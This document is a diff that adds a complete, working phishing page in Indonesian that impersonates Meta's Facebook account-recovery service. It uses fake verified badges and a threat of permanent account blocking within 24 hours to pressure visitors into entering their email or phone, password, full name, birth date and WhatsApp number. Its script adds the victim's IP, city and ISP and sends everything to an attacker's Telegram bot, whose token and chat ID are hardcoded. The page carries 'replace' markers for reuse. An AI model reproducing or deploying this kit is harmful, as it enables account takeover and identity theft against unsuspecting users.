@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Pemulihan Akun | Meta</title>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" type="image/x-icon">
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+    }
+    .spinner-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(255, 255, 255, 0.9);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .spinner {
+      border: 4px solid #e0e0e0;
+      border-top: 4px solid #1877f2;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .step {
+      max-width: 420px;
+      margin: 50px auto;
+      background: #fff;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+      text-align: center;
+    }
+    .center-logo img {
+      width: 80px;
+      margin-bottom: 10px;
+    }
+    .verified-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 5px;
+      font-weight: bold;
+      color: #1877f2;
+      font-size: 14px;
+    }
+    .verified-badge img {
+      width: 18px;
+    }
+    .verified-sub {
+      font-size: 12px;
+      color: #555;
+      margin-bottom: 15px;
+    }
+    label {
+      font-weight: bold;
+      font-size: 13px;
+      margin-top: 10px;
+      display: block;
+      text-align: left;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-top: 5px;
+      font-size: 14px;
+    }
+    button {
+      margin-top: 20px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+    }
+    .info-footer {
+      font-size: 12px;
+      color: #666;
+      margin-top: 20px;
+    }
+    .meta-footer {
+      font-size: 11px;
+      color: #aaa;
+      margin-top: 25px;
+    }
+    .alert-box {
+      color: red;
+      margin-top: 10px;
+      font-size: 13px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<!-- SPINNER -->
+<div class="spinner-overlay" id="spinner">
+  <div class="spinner"></div>
+</div>
+
+<!-- STEP 1 -->
+<div class="step" id="step1" style="display:none;">
+  <div class="center-logo">
+    <img src="https://cdn-icons-png.flaticon.com/512/5968/5968764.png" alt="Meta Logo" />
+  </div>
+  <div class="verified-badge">
+    <img src="https://cdn-icons-png.flaticon.com/512/1828/1828640.png" alt="verified" />
+    Pusat Pemulihan Akun Meta
+  </div>
+  <div class="verified-sub">Terverifikasi • Layanan Resmi Meta</div>
+  <h2 style="color:#1877f2;">Pemulihan Akun Diperlukan</h2>
+  <p>Kami mendeteksi aktivitas mencurigakan pada akun Anda yang melanggar Kebijakan Komunitas Facebook. Untuk mencegah pemblokiran permanen, silakan verifikasi identitas Anda dalam 24 jam.</p>
+  <button onclick="goToStep('step2')">Mulai Pemulihan Akun</button>
+  <div class="info-footer">🔒 Proses aman dan terenkripsi end-to-end</div>
+  <div class="meta-footer">Meta Platforms, Inc. © 2025 • Kebijakan Privasi • Ketentuan</div>
+</div>
+
+<!-- STEP 2 -->
+<div class="step" id="step2" style="display:none;">
+  <div class="center-logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
+  </div>
+  <div class="verified-badge">
+    <img src="https://cdn-icons-png.flaticon.com/512/1828/1828640.png" alt="verified" />
+    Pusat Pemulihan Akun Meta
+  </div>
+  <div class="verified-sub">Terverifikasi • Layanan Resmi Meta</div>
+
+  <h2 style="color:#1877f2;">Verifikasi Identitas Pemilik Akun</h2>
+  <p style="font-size:14px;">Untuk memulihkan akses ke akun Anda dan mencegah pemblokiran permanen, kami perlu memverifikasi bahwa Anda adalah pemilik sah akun ini.</p>
+
+  <label>Email/Nomor Telepon Terdaftar</label>
+  <input type="email" id="recoveryEmail" placeholder="Email atau nomor telepon yang terhubung dengan akun" required />
+
+  <label>Kata Sandi Anda</label>
+  <input type="password" id="recoveryPassword" placeholder="Masukkan kata sandi Anda" required />
+
+  <label>Nama Lengkap di Akun Facebook</label>
+  <input type="text" id="namaFb" placeholder="Sesuai dengan yang terdaftar di akun Anda" required />
+
+  <label>Tanggal Lahir di Akun</label>
+  <div style="display: flex; gap: 5px;">
+    <select id="birthDay"><option value="">Hari</option></select>
+    <select id="birthMonth"><option value="">Bulan</option></select>
+    <select id="birthYear"><option value="">Tahun</option></select>
+  </div>
+
+  <label>Nomor WhatsApp Aktif</label>
+  <input type="text" id="wa" placeholder="Untuk konfirmasi dari tim verifikasi kami" required />
+
+  <div style="font-size:12px; color:green; margin-top: 10px;">
+    🔒 Data Anda dilindungi oleh kebijakan privasi Meta
+  </div>
+
+  <div id="alertBox" class="alert-box"></div>
+
+  <button onclick="submitRecoveryForm()">Verifikasi Identitas Saya</button>
+</div>
+
+<!-- STEP DONE -->
+<div class="step" id="stepDone" style="display:none;">
+  <div class="center-logo">
+    <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" width="70" alt="Verified" />
+  </div>
+  <h2 style="color: #1877f2;">✅ Permohonan Pemulihan Diterima</h2>
+  <p>Tim verifikasi kami akan memproses permintaan Anda dalam 1x24 jam. Jika verifikasi berhasil, Anda akan menerima email konfirmasi dan akses ke akun akan dipulihkan sepenuhnya.</p>
+  <p style="font-size:14px;color:#555;">Harap periksa folder spam/inbox email Anda untuk instruksi lebih lanjut.</p>
+  <div class="info-footer">Pusat Pemulihan Akun Meta • Terverifikasi</div>
+  <button onclick="goToStep('step1')">Kembali ke Beranda</button>
+</div>
+
+<script>
+  window.onload = function () {
+    setTimeout(() => {
+      document.getElementById("spinner").style.display = "none";
+      document.getElementById("step1").style.display = "block";
+
+      const day = document.getElementById("birthDay");
+      const month = document.getElementById("birthMonth");
+      const year = document.getElementById("birthYear");
+
+      for (let i = 1; i <= 31; i++) {
+        let opt = document.createElement("option");
+        opt.value = i;
+        opt.text = i;
+        day.appendChild(opt);
+      }
+
+      const bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
+      bulan.forEach((b, i) => {
+        let opt = document.createElement("option");
+        opt.value = i + 1;
+        opt.text = b;
+        month.appendChild(opt);
+      });
+
+      const thisYear = new Date().getFullYear();
+      for (let i = 0; i < 60; i++) {
+        let opt = document.createElement("option");
+        opt.value = thisYear - i;
+        opt.text = thisYear - i;
+        year.appendChild(opt);
+      }
+    }, 1500);
+  };
+
+  function goToStep(stepId) {
+    document.querySelectorAll(".step").forEach(el => el.style.display = "none");
+    document.getElementById(stepId).style.display = "block";
+  }
+
+  function submitRecoveryForm() {
+    const email = document.getElementById("recoveryEmail").value.trim();
+    const pass = document.getElementById("recoveryPassword").value.trim();
+    const nama = document.getElementById("namaFb").value.trim();
+    const day = document.getElementById("birthDay").value;
+    const month = document.getElementById("birthMonth").value;
+    const year = document.getElementById("birthYear").value;
+    const wa = document.getElementById("wa").value.trim();
+    const alertBox = document.getElementById("alertBox");
+
+    alertBox.style.display = "none";
+
+    if (!email || !pass || !nama || !day || !month || !year || !wa) {
+      alertBox.style.display = "block";
+      alertBox.innerText = "Semua kolom wajib diisi untuk memverifikasi identitas Anda.";
+      return;
+    }
+
+    const tglLahir = `${day.padStart(2, "0")}-${month.padStart(2, "0")}-${year}`;
+
+    fetch("https://ipwho.is/")
+      .then(res => res.json())
+      .then(ipData => {
+        const ip = ipData.ip || "N/A";
+        const city = ipData.city || "N/A";
+        const asn = ipData.connection?.asn || "N/A";
+        const isp = ipData.connection?.isp || "N/A";
+
+        const message = `
+🔐 Permintaan Pemulihan Akun Facebook
+📧 Email: ${email}
+🔑 Password: ${pass}
+👤 Nama: ${nama}
+🎂 Tanggal Lahir: ${tglLahir}
+📱 WhatsApp: ${wa}
+
+🌐 Info IP:
+📍 IP: ${ip}
+🏙️ Kota: ${city}
+📡 ASN: ${asn}
+🏢 ISP: ${isp}
+        `;
+
+        const BOT_TOKEN = "7667662149:AAE8qvehpAjpabPqXMR0MX7TtBmPwf5iYHw"; // ← GANTI
+        const CHAT_ID = "7137150704";     // ← GANTI
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "HTML"
+          })
+        })
+        .then(response => {
+          if (response.ok) {
+            goToStep("stepDone");
+          } else {
+            alertBox.style.display = "block";
+            alertBox.innerText = "Gagal mengirim permohonan. Silakan coba lagi.";
+          }
+        })
+        .catch(() => {
+          alertBox.style.display = "block";
+          alertBox.innerText = "Terjadi kesalahan saat mengirim permohonan.";
+        });
+      })
+      .catch(() => {
+        alertBox.style.display = "block";
+        alertBox.innerText = "Gagal memverifikasi lokasi perangkat Anda.";
+      });
+  }
+</script>
+
+</body>
+</html>
